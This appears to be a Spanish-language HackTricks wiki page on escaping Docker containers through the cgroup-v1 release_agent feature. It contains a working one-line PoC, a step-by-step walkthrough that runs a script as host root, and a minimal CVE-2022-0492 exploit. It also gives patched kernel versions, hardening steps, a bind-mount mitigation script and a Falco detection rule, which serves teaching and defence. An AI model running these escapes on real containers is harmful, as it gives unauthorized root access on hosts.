# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Para más detalles, consulta el** [**post original del blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Este es solo un resumen:

---

## PoC Clásico (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
El PoC abusa de la característica **cgroup-v1** `release_agent`: cuando la última tarea de un cgroup que tiene `notify_on_release=1` sale, el kernel (en los **namespaces iniciales en el host**) ejecuta el programa cuyo nombre de ruta se almacena en el archivo escribible `release_agent`. Debido a que esa ejecución ocurre con **privilegios de root completos en el host**, obtener acceso de escritura al archivo es suficiente para una fuga de contenedor.

### Breve recorrido legible

1. **Preparar un nuevo cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # o –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Apuntar `release_agent` a un script controlado por el atacante en el host**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Dejar la carga útil**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Activar el notificador**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # añadirnos y salir inmediatamente
cat /output                                  # ahora contiene procesos del host
```

---

## Vulnerabilidad del kernel de 2022 – CVE-2022-0492

En febrero de 2022, Yiqi Sun y Kevin Wang descubrieron que **el kernel *no* verificaba las capacidades cuando un proceso escribía en `release_agent` en cgroup-v1** (función `cgroup_release_agent_write`).

Efectivamente, **cualquier proceso que pudiera montar una jerarquía de cgroup (por ejemplo, a través de `unshare -UrC`) podría escribir una ruta arbitraria en `release_agent` sin `CAP_SYS_ADMIN` en el *namespace* de usuario *inicial***. En un contenedor Docker/Kubernetes configurado por defecto y ejecutándose como root, esto permitió:

* escalada de privilegios a root en el host; ↗
* fuga de contenedor sin que el contenedor fuera privilegiado.

El fallo fue asignado como **CVE-2022-0492** (CVSS 7.8 / Alto) y se corrigió en las siguientes versiones del kernel (y todas las posteriores):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Commit de parche: `1e85af15da28 "cgroup: Fix permission checking"`.

### Explotación mínima dentro de un contenedor
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Si el kernel es vulnerable, el binario busybox del *host* se ejecuta con acceso total de root.

### Endurecimiento y Mitigaciones

* **Actualizar el kernel** (≥ versiones anteriores). El parche ahora requiere `CAP_SYS_ADMIN` en el *espacio de nombres* de usuario *inicial* para escribir en `release_agent`.
* **Preferir cgroup-v2** – la jerarquía unificada **eliminó completamente la característica `release_agent`**, eliminando esta clase de escapes.
* **Deshabilitar espacios de nombres de usuario no privilegiados** en hosts que no los necesiten:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Control de acceso obligatorio**: políticas de AppArmor/SELinux que niegan `mount`, `openat` en `/sys/fs/cgroup/**/release_agent`, o eliminan `CAP_SYS_ADMIN`, detienen la técnica incluso en kernels vulnerables.
* **Máscara de enlace de solo lectura** para todos los archivos `release_agent` (ejemplo de script de Palo Alto):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Detección en tiempo de ejecución

[`Falco`](https://falco.org/) incluye una regla incorporada desde la v0.32:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
La regla se activa en cualquier intento de escritura a `*/release_agent` desde un proceso dentro de un contenedor que aún posee `CAP_SYS_ADMIN`.

## Referencias

* [Unit 42 – CVE-2022-0492: escape de contenedor a través de cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – análisis detallado y script de mitigación.
* [Regla y guía de detección de Sysdig Falco](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
